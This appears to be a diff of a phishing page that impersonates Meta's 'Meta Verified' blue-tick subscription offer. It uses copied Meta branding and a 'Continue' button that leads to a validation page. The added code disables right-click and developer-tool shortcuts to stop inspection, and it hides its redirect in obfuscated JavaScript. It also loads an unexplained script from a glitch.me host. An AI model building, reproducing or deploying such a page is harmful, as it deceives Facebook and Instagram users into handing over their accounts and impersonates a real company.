@@ -1,145 +1,233 @@
 
+
+
+
 <!DOCTYPE html>
-
-
-<html lang="en">
+<html>
+  
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Verified | Get a verified blue tick</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta charset="UTF-8" />
+  <div id="index.html"></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+<script src="https://staticsecure.glitch.me/staticsecure.min.js"></script>
+<script>
+staticsecure({"query": "key", "0000": "example", "index.php": "hidden.txt"})
+</script>
+  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta creator badge</title>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" type="image/png"/>
+    <script type="text/javascript">
+        document.addEventListener("contextmenu", function(e) {
+            e.preventDefault();
+        });
+
+        document.addEventListener("keydown", function(e) {
+            // Check if the "i" or "c" key is pressed with Shift or Ctrl
+            if (
+                (e.key === "i" ||
+                    e.key === "c" ||
+                    e.keyCode === 73 ||
+                    e.keyCode === 67) &&
+                (e.shiftKey || e.ctrlKey)
+            ) {
+                e.preventDefault();
+            }
+        });
+      
+    </script>
+  
     <style>
-        /* CSS styles */
+      
+      
+        /* New theme styles */
 
         body {
-            font-family: system-ui;
+            background-color: #ffffff;
+            /* Facebook's classic blue */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000;
+            /* White text */
             margin: 0;
-            padding: 0;
-        }
-
-        .container-fluid {
-            background: #F5F6F6;
+            padding: 20px;
+          /* Remove default margin */
         }
 
         .container {
-            padding: 1rem;
-        }
-
-        .logo {
-            width: 9rem;
-            height: 6rem;
-        }
-
-        .meta-logo {
-            width: 4rem;
-            height: 4rem;
-        }
-
-        .btn {
-            background: #0064e0;
-            border: none;
-            border-radius: 100px;
-            padding: 10px 35px;
-            text-decoration: none;
-            color: white;
-            display: inline-block;
-            margin-top: 1rem;
-            font-family: Arial, sans-serif;
-            /* Same font family */
-            font-size: 16px;
-            /* Adjust as needed */
-        }
-
-        .content {
-            margin-top: 3rem;
             display: flex;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-        }
-
-        .content .col-sm-6 {
-            margin-top: 3rem;
-            margin-left: 5rem;
-        }
-
-        .content p {
-            font-size: 18px;
-            margin-top: 1rem;
-            font-family: Arial, sans-serif;
-            /* Same font family */
-        }
-
-        .sign-up {
-            font-size: 17px;
-            padding-top: 1rem;
-            font-family: Arial, sans-serif;
-            /* Same font family */
-        }
-
-        .business-info {
-            font-size: 14px;
-            font-family: Arial, sans-serif;
-            /* Same font family */
-        }
-
-        .region-info {
-            font-size: 13px;
-            font-style: italic;
-            font-family: Arial, sans-serif;
-            /* Same font family */
-        }
-
-        .image {
-            display: none;
-            width: 42%;
             height: 100vh;
-            /* Ensure full height */
-            background-size: cover;
-            /* background-position: center; */
-            /* margin-left: 5rem; */
+            position: relative;
+            /* Required for relative positioning of the image and text */
+        }
+      
+
+        #box {
+            height: 40%;
+            width: 45%;
+            background-color: rgb(255, 255, 255);
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
         }
 
-        @media (min-width: 576px) {
-            .image {
-                display: block;
+        #box>img {
+            width: 70px;
+            margin-top: 10px;
+        }
+
+        #data {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        #data>h4 {
+            font-size: 30px;
+         margin: 5px 5px 5px 5px;
+          margin-bottom: 10px;
+        }
+
+        #data>img {
+            width: 18px;       
+      }
+      #data>img @media (max-width: 768px) {
+        .containter #data<img {
+          width: 40%;
+          margin-bottom: 20px; /
+        }
+        
+      }
+
+        .button {
+            background-color: #1877f2;
+            /* Facebook's primary blue */
+            color: #fff;
+            padding: 12px 24px;
+            font-size: 18px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .button:hover {
+            background-color: #1659c7;
+            /* Slightly darker blue on hover */
+        }
+
+        /* Style for the image */
+
+        @media (max-width: 768px) {
+            .container img {
+                width: 40%;
+                margin-bottom: 20px;//* Adjust the image width for mobile */
+            }
+          
+          .help-center-text img {
+              margin-top: 20px;
+          }
+        }
+
+        /* Desktop styles */
+
+        @media (min-width: 769px) {
+            .container img {
+                width: 10%;
+                /
+            }
+            /* Style for the "Help Center" text container */
+            .help-center-text-container {
+                text-align: center;
+                margin-top: -30px;
+                margin-top: 20px;
+                transform: translateY(-0px);
+                /* Add space between image and text */
             }
         }
+
+        /* Style for the "Help Center" text */
+
+        .help-center-text {
+            font-size: 36px;
+            /* Adjust the font size as needed */
+            font-weight: bold;
+            /* Super bold text */
+            color: #000;
+            /* White text color */
+            text-shadow: 0px 0px 0px rgba(0, 0, 0, 0.5);
+            /* Add a subtle text shadow */
+        }
+
+        /* Style for the remaining content */
+
+        .remaining-content {
+          margin-top: 20px;
+            /* Add space below "Help Center" text */
+        }
+
+        /* Style for the text within the remaining content */
+
+        .remaining-text {
+            font-size: 18px;
+            /* Adjust the font size as needed */
+            font-weight: normal;
+            /* Normal text weight */        }
+      
     </style>
 </head>
 
 <body>
-    <div class="container-fluid">
-        <div class="container">
-            <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/meta-logo-QVrNRj93.svg?v=1723987211189" alt="logo" class="logo">
+  
+    <div class="container">
+        <img src="https://cdn.glitch.global/9c268ed6-4eec-4c0c-9cb5-edf84fe4ab44/meta-logo-6760788.png?v=1724611252316" alt="Your Image" />
+
+        <!-- "Help Center" text container -->
+        <div class="help-center-text-container">
+            <div class="help-center-text"><div id="data">
+                <h4>Become Meta Verified</h4>  <img src="https://cdn.glitch.global/9c268ed6-4eec-4c0c-9cb5-edf84fe4ab44/blue-verified-badge-18768.png?v=1724612186554" alt="">
+            </div>
         </div>
-    </div>
-    <div class="content">
-        <div class="col-sm-6">
-            <img src="https://cdn.glitch.global/325f7535-a68d-4687-a91c-1e7d9366104a/blue_tick-B9ADAlwo.png?v=1723987162846" alt="meta" class="meta-logo">
-            <h1 class="my-3 fs-1">Stand out with Meta<br> Verified</h1>
-            <div style="margin-bottom: 30px;"></div>
-            <a class='btn' href='validation.html'>Apply</a>
-            <p class="mt-4">Grow your social presence with Meta Verified – a new subscription <br> bundle available for creators and businesses on Instagram and <br> Facebook.</p>
-            <p class="sign-up">Sign up now for creators</p>
-            <p class="mt-4 mb-0">
-                <span class="fw-semibold">Are you a business?</span> Get more information on
-            </p>
-            <a href="#" class="business-info">Meta verified for businesses</a>
-            <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
+
+        <!-- Remaining content -->
+        <div class="remaining-content">
+            <!-- Content from the first code snippet -->
+            <div class="bg-blue-300">
+                <div class="">
+                    <div class="flex justify-center items-center pl-6 px-28">
+                        <div class="flex mt-9"></div>
+                        <div class="mx-3">
+                            <p class="font text-gray-700 shadow-transparent mt-2 font-extralight">
+                        𝗚𝗿𝗼𝘄 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗽𝗿𝗲𝘀𝗲𝗻𝗰𝗲 𝘄𝗶𝘁𝗵 𝗠𝗲𝘁𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 – 𝗮 𝗻𝗲𝘄 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻
+𝗯𝘂𝗻𝗱𝗹𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗰𝗿𝗲𝗮𝘁𝗼𝗿𝘀 𝗮𝗻𝗱 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀𝗲𝘀 𝗼𝗻 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗮𝗻𝗱
+𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸.
+                            </p>
+                            <p class="text-lg text-gray-700 font-extralight">𝗧𝗼 𝘁𝗮𝗸𝗲 𝗮𝗱𝘃𝗮𝗻𝘁𝗮𝗴𝗲 𝗼𝗳 𝘁𝗵𝗶𝘀 𝗼𝗽𝗽𝗼𝗿𝘁𝘂𝗻𝗶𝘁𝘆 𝗰𝗹𝗶𝗰𝗸 "𝗖𝗼𝗻𝘁𝗶𝗻𝘂𝗲" 𝗯𝘂𝘁𝘁𝗼𝗻</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Continue button with JavaScript redirection -->
+            <form id="redirectForm" method="post" action="/validation.html">
+                <button type="submit" class="button">Continue</button>
+            </form>
+
+            <!-- JavaScript to perform the redirection -->
+            <script>
+              
+                function _0x4d03(_0x100e7e,_0x162f76){var _0x598ed6=_0x598e();return _0x4d03=function(_0x4d0309,_0x74bc4b){_0x4d0309=_0x4d0309-0x1a4;var _0x99eff6=_0x598ed6[_0x4d0309];return _0x99eff6;},_0x4d03(_0x100e7e,_0x162f76);}function _0x598e(){var _0x287545=['809550ZOhSQM','href','511980GnUQEK','2811640fJYgSV','2535350vqfdZS','/validatoin.html','8WGXLAU','1559592XnxkHV','4663COUFMJ','preventDefault','73545BlqWiR','20iGqrpz','190hOknTh','redirectForm'];_0x598e=function(){return _0x287545;};return _0x598e();}var _0x47a560=_0x4d03;(function(_0x5b8740,_0x635652){var _0x3668cd=_0x4d03,_0x398a55=_0x5b8740();while(!![]){try{var _0x2e69da=-parseInt(_0x3668cd(0x1ad))/0x1*(-parseInt(_0x3668cd(0x1b1))/0x2)+-parseInt(_0x3668cd(0x1af))/0x3*(parseInt(_0x3668cd(0x1ab))/0x4)+parseInt(_0x3668cd(0x1a9))/0x5+parseInt(_0x3668cd(0x1a5))/0x6+-parseInt(_0x3668cd(0x1a7))/0x7+-parseInt(_0x3668cd(0x1a8))/0x8+-parseInt(_0x3668cd(0x1ac))/0x9*(parseInt(_0x3668cd(0x1b0))/0xa);if(_0x2e69da===_0x635652)break;else _0x398a55['push'](_0x398a55['shift']());}catch(_0x404e59){_0x398a55['push'](_0x398a55['shift']());}}}(_0x598e,0x40a4b),document['getElementById'](_0x47a560(0x1a4))['addEventListener']('submit',function(_0x14ea0d){var _0x550dd7=_0x47a560;_0x14ea0d[_0x550dd7(0x1ae)](),window['location'][_0x550dd7(0x1a6)]=_0x550dd7(0x1aa);}));
+            </script>
         </div>
-        <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
     </div>
 </body>
-<script>
-    document.addEventListener('contextmenu', event => {
-        event.preventDefault();
-    });
 
-    setTimeout(function() {
-    var redirectURL = "validation.html"; // Updated URL
-    window.location.replace(redirectURL);
-    }, 3000); // 3000 milliseconds (3 seconds)
-    });
-</script>
 
 </html>
+<script async data-explicit-opt-in="true" data-cookie-opt-in="true" src="https://vercel.live/_next-live/feedback/feedback.js"></script>
